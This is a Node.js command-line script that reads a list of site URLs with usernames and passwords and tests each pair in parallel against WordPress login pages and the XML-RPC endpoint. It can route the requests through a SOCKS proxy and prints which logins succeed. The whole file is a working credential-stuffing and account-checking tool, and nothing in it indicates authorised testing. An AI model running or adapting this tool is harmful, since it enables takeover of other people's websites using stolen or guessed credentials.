require('dotenv').config();
const { Command } = require('commander');
const program = new Command();
const fs = require('fs/promises');
const {default: axios} = require('axios');
const urlParser = require('node:url');
const util = require('util');
const xmlrpc = require('@0xengine/xmlrpc');
const qs = require('node:querystring');
const {SocksProxyAgent} = require('socks-proxy-agent');

const DefaultNReq = 10;
const DefaultFrom = 0;
const DefaultSeparator = ';';
const RequestTimeout = 60000; // 1 min 
 
function rpcTimeout(ms) {
	return new Promise((resolve)=>{
		setTimeout(()=>resolve(new Error), ms)
	});
}

function getAxiosInstance() {
	let instance;
	if (process.env.PROXY_SOCKS === "true") {
		const socks_proxy = 'socks://' + (process.env.PROXY_SOCKS_USER ? 
			process.env.PROXY_SOCKS_USER + ":" + 
			process.env.PROXY_SOCKS_PASS + "@" : "") +
			process.env.PROXY_SOCKS_HOST + ":" + 
			process.env.PROXY_SOCKS_PORT 
		const socksAgent = new SocksProxyAgent(socks_proxy);
		instance = new axios.create({
				httpAgent: socksAgent,
				httpsAgent:socksAgent
		});
	}
	else {
		instance = new axios.create();
	}
	return instance;
}

const axiosInst = getAxiosInstance();

function createXmlClient(hostname, protocol) {
	const xmlrpcOptions = {
		host: hostname,
		port: protocol === 'https:' ? 443 : 80, // NOTE: protocol comes with semicolon (:)
		path: '/xmlrpc.php'
	};
	
	const client = xmlrpcOptions.port === 443 ? 
		xmlrpc.createSecureClient(xmlrpcOptions) : 
		xmlrpc.createClient(xmlrpcOptions);

	client.methodCall = util.promisify(client.methodCall.bind(client));
	return client;
}



async function wpLogin(host, protocol, username, password) {
	const payload = qs.stringify({
		log: username,
		pwd: password,
		testcookie: '1',
		'wp-submit': 'Log In',
		redirect_to: `${protocol}//${host}/wp-admin`
	});
	
	let loggedIn = false;
	const url = `${protocol}//${host}/wp-login.php`;
	
	try { 
		const response = await axiosInst.post(
			url, 
			payload,
			{
				maxRedirects: 5, // cannot be 0, if 0 then misses many logins
				timeout: RequestTimeout,
				validateStatus: function (status) {
					// if this function returns true, exception is not thrown, so
					// in simplest case just return true to handle status checks externally.
					return true;
				},
				headers: {
					Cookie: `wordpress_test_cookie=WP%20Cookie%20check`,
				}
			}
		);
		
		// console.log(`url: ${url} status: ${response.status}`)
		if (response.status === 200) {
			const {headers} = response;
			loggedIn = headers['set-cookie'] !== undefined && headers['set-cookie'].find(c=>c.match("wordpress_logged_in")) !== undefined;
		} 
	} 
	catch(err) {
		//console.error(`url:${url}, msg: ${err.message}`);
	} // if any error occurs  we want to ignore it and return result with all falses
	
	return loggedIn;
}




async function run(pathToTargets, from, nParrallelRequests, separator) {

	const contents = await fs.readFile(pathToTargets, {encoding: 'utf8'});
	const lines = contents.split(/\r\n?|\n/).filter(line=>line.startsWith('http'));
	// console.log(lines);
	const nBulks = lines.length % nParrallelRequests === 0 ? 
		lines.length / nParrallelRequests :
		Math.trunc(lines.length / nParrallelRequests) + 1;
	
	console.log(`nBulks: ${nBulks}, from: ${from}, nReq: ${nParrallelRequests}, separator: ${separator}`);
	for (let i=from; i<nBulks; i++) {
		const wpLoginPromises = [];
		const getUsersBlogsPromises = [];
		const startIdx = i*nParrallelRequests;
		const endIdx = Math.min(lines.length, startIdx + nParrallelRequests);
		
		console.log(`bulk: ${i} of ${nBulks}, startIdx: ${startIdx} endIdx: ${endIdx}`);
		for (let j=startIdx; j<endIdx; j++) {
			// console.log(`working on line: ${j}|${lines[j]}`);
			const re = new RegExp(`${separator}(?!\/\/)`);
			const [url, username, password] = lines[j].split(re);
			// console.log(`url:${url}, user:${username}, pass:${password}`);
			let host, hostname, protocol;
			try {
				({host, hostname, protocol} = new urlParser.URL(url));
			}
			catch(err) {
				console.log(`error parsing url: ${err.message}`);
				continue;
			}
			wpLoginPromises.push(wpLogin(host, protocol, username, password));
			

			// Some sites make too many redirects. We combat this in axios with RequestTimeout and xmlrpc client we combat with Promise.race.
			const xmlClient = createXmlClient(hostname, protocol);
			const rpcPromise = xmlClient.methodCall('wp.getUsersBlogs', [username, password]).catch(e=>e); // rpc primise
			const rpcTimeoutPromise = rpcTimeout(RequestTimeout);
			getUsersBlogsPromises.push(Promise.race([rpcPromise, rpcTimeoutPromise]));
		}

		// Note: if ERROR 'Unknown tag TITLE' or similar is returned to XMLRPC request that means the /xmlrpc.php page is forbidden.
		// It's not forbidden by Wordpress but by web server. When XMLRPC is forbidden by Wordpress plugin,
		// there is XML error.
		
		const wpLoginResults = await Promise.allSettled(wpLoginPromises);
		const getUsersBlogsResults = await Promise.allSettled(getUsersBlogsPromises);

		for (let j=0; j<wpLoginResults.length; j++) {
			const k = i*nParrallelRequests + j;
			const line = lines[k];
			const wpLoginResult = wpLoginResults[j].value;
			
			const xmlLoginResult = !(getUsersBlogsResults[j].value instanceof Error) && getUsersBlogsResults[j].value.errno === undefined
			const report = `login|${line}|${wpLoginResult}|${xmlLoginResult}`;
			console.log(report);
		}
	}
	console.log('Finished all chunks')
}

program
	.requiredOption('-t, --targets <string>', 'path to file with the target lines')
	.option('-f, --from <number>', 'start from bulk number', DefaultFrom)
	.option('-n, --requests <number>', 'parallel requests to launch', DefaultNReq)
	.option('-s, --separator <char>', 'field separator', DefaultSeparator)
	.action(async ({targets, from, requests, separator})=>{
		await run(targets, from, requests, separator);
		console.log('Finished run()');
	});


async function main() {
	await program.parseAsync(process.argv);
	console.log('Buy!');
	process.exit(0); // something is not closed sometimes
}

main()